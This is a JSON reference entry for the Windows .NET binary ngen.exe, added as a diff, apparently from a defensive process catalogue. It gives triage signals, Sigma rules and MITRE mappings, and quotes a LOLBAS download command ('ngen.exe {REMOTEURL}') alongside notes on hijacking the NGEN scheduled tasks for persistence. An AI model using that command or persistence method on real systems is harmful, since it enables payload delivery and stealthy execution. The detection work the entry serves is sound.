@@ -1,0 +1,178 @@
+{
+  "name": "ngen.exe",
+  "aliases": [
+    "ngen"
+  ],
+  "category": "Utility",
+  "tags": [
+    "microsoft",
+    "core-windows",
+    "lolbin"
+  ],
+  "description": "ngen.exe is the .NET Native Image Generator, which precompiles .NET assemblies to native code for faster startup. It runs as part of .NET servicing. Attackers abuse the scheduled tasks and execution paths around it to run code through a signed Microsoft binary.\n",
+  "about": "ngen.exe compiles managed assemblies into native images and maintains those images, work normally driven by .NET setup and by the \".NET Framework NGEN\" scheduled tasks that run during idle time. It ships with the .NET Framework, so the genuine binary lives under `C:\\Windows\\Microsoft.NET\\Framework` and `Framework64`, not `System32`.\n\nLegitimately, ngen runs automatically after .NET updates and during maintenance windows, parented by the Task Scheduler. Interactive or oddly-parented invocations are what give an instance meaning.\n",
+  "publisher": null,
+  "issuer": null,
+  "signed": null,
+  "signing_rate": null,
+  "signing_algorithm": null,
+  "signers": [],
+  "file_details": null,
+  "file_versions": [],
+  "file_sizes": [],
+  "cert_thumbprints": [],
+  "provenance": "curated",
+  "prevalence_band": "unknown",
+  "prevalence_score": null,
+  "host_prevalence": null,
+  "execution_rank": null,
+  "community_score": null,
+  "first_seen": null,
+  "last_seen": null,
+  "machine_count": null,
+  "execution_count": null,
+  "expected_paths": [],
+  "expected_parents": [],
+  "expected_children": [],
+  "expected_grandparents": [],
+  "expected_grandchildren": [],
+  "network_ports": [],
+  "listening_ports": [],
+  "network_destinations": [],
+  "loaded_modules": [],
+  "named_pipes": [],
+  "user_contexts": [],
+  "integrity_levels": [],
+  "sessions": [],
+  "instance_counts": [],
+  "token_privileges": [],
+  "process_handles": [],
+  "os_prevalence": [],
+  "anomaly_signals": [
+    {
+      "signal": "Image path outside the `Microsoft.NET\\Framework` directories",
+      "severity": "high"
+    },
+    {
+      "signal": "Invoked to execute an assembly from a user-writable path",
+      "severity": "high"
+    },
+    {
+      "signal": "Parent is an Office application, a script host, `cmd.exe`, or `powershell.exe`",
+      "severity": "high"
+    },
+    {
+      "signal": "The NGEN scheduled tasks modified to point at attacker code",
+      "severity": "high"
+    }
+  ],
+  "command_lines": [],
+  "known_hashes": [],
+  "security_notes": "ngen.exe is a system-binary proxy and a persistence aid (T1218). Because it compiles and can trigger execution of .NET assemblies, it has been used to run attacker code under a trusted Microsoft binary, bypassing application-control rules that allow .NET tooling. The built-in NGEN scheduled tasks are also a persistence surface: pointing them at attacker code gives a SYSTEM-context execution that runs during normal maintenance.\n\nBecause ngen legitimately runs only as part of .NET servicing, an ngen invoked interactively, by an Office or script-host parent, or against an assembly in a user-writable path is what separates abuse from routine native-image generation.\n",
+  "mitre_attack": [
+    "T1218"
+  ],
+  "technique_matching": "strict",
+  "references": [
+    "https://lolbas-project.github.io/lolbas/Binaries/Ngen/",
+    "https://attack.mitre.org/techniques/T1218/"
+  ],
+  "lolbas": {
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Ngen/",
+    "commands": [
+      {
+        "command": "ngen.exe {REMOTEURL}",
+        "usecase": "It will download a remote payload and place it in INetCache.",
+        "mitreID": "T1105",
+        "category": "Download"
+      }
+    ]
+  },
+  "sigma": [
+    {
+      "id": "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+      "title": "Process Creation Using Sysnative Folder",
+      "level": "medium",
+      "techniques": [
+        "T1055"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_sysnative.yml",
+      "match": "image"
+    },
+    {
+      "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
+      "title": "Uncommon Svchost Parent Process",
+      "level": "medium",
+      "techniques": [
+        "T1036.005"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_svchost_uncommon_parent_process.yml",
+      "match": "parent"
+    },
+    {
+      "id": "96036718-71cc-4027-a538-d1587e0006a7",
+      "title": "Windows Processes Suspicious Parent Directory",
+      "level": "low",
+      "techniques": [
+        "T1036.003",
+        "T1036.005"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_proc_wrong_parent.yml",
+      "match": "parent"
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "curated": false,
+      "lolbas": true,
+      "tactics": [
+        {
+          "name": "Command and Control",
+          "order": 12
+        }
+      ]
+    },
+    {
+      "id": "T1218",
+      "name": "System Binary Proxy Execution",
+      "curated": true,
+      "lolbas": false,
+      "tactics": [
+        {
+          "name": "Stealth",
+          "order": 6
+        }
+      ]
+    }
+  ],
+  "triage": [
+    {
+      "signal": "Image path outside the `Microsoft.NET\\Framework` directories",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Image path outside the <code>Microsoft.NET\\Framework</code> directories"
+    },
+    {
+      "signal": "Invoked to execute an assembly from a user-writable path",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Invoked to execute an assembly from a user-writable path"
+    },
+    {
+      "signal": "Parent is an Office application, a script host, `cmd.exe`, or `powershell.exe`",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Parent is an Office application, a script host, <a class=\"proc-link\" href=\"/processes/cmd.exe\"><code>cmd.exe</code></a>, or <a class=\"proc-link\" href=\"/processes/powershell.exe\"><code>powershell.exe</code></a>"
+    },
+    {
+      "signal": "The NGEN scheduled tasks modified to point at attacker code",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "The NGEN scheduled tasks modified to point at attacker code"
+    }
+  ],
+  "about_html": "<p>ngen.exe compiles managed assemblies into native images and maintains those images, work normally driven by .NET setup and by the \".NET Framework NGEN\" scheduled tasks that run during idle time. It ships with the .NET Framework, so the genuine binary lives under <code>C:\\Windows\\Microsoft.NET\\Framework</code> and <code>Framework64</code>, not <code>System32</code>.</p>\n<p>Legitimately, ngen runs automatically after .NET updates and during maintenance windows, parented by the Task Scheduler. Interactive or oddly-parented invocations are what give an instance meaning.</p>",
+  "security_notes_html": "<p>ngen.exe is a system-binary proxy and a persistence aid (<a href=\"https://attack.mitre.org/techniques/T1218/\" target=\"_blank\" rel=\"noreferrer noopener\">T1218</a>). Because it compiles and can trigger execution of .NET assemblies, it has been used to run attacker code under a trusted Microsoft binary, bypassing application-control rules that allow .NET tooling. The built-in NGEN scheduled tasks are also a persistence surface: pointing them at attacker code gives a SYSTEM-context execution that runs during normal maintenance.</p>\n<p>Because ngen legitimately runs only as part of .NET servicing, an ngen invoked interactively, by an Office or script-host parent, or against an assembly in a user-writable path is what separates abuse from routine native-image generation.</p>"
+}
